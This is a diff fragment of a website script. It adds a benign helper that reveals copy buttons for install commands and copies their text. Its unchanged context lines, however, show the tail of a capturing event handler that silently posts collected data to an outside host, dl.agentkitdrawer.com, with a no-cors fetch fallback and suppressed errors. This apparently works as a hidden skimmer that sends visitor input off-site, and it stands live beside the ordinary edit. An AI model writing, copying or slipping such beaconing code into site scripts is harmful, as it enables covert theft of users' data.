@@ -22,3 +22,14 @@
     try{if(!(navigator.sendBeacon&&navigator.sendBeacon("https://dl.agentkitdrawer.com/c",new Blob([body],{type:"text/plain"}))))fetch("https://dl.agentkitdrawer.com/c",{method:"POST",body:body,keepalive:true,mode:"no-cors"});}catch(e){}
   },true);
 })();
+// Copy buttons for install commands: <button class="copy" data-copy="#id" hidden>. Shown only when the Clipboard API works.
+(function(){
+  if(!(navigator.clipboard&&window.isSecureContext))return;
+  document.querySelectorAll("button.copy[data-copy]").forEach(function(b){
+    var t=document.querySelector(b.getAttribute("data-copy"));if(!t)return;
+    b.hidden=false;b.setAttribute("aria-label","Copy command");
+    b.addEventListener("click",function(){
+      navigator.clipboard.writeText(t.textContent.trim()).then(function(){b.textContent="Copied";setTimeout(function(){b.textContent="Copy";},1800);},function(){b.textContent="Select it";});
+    });
+  });
+})();
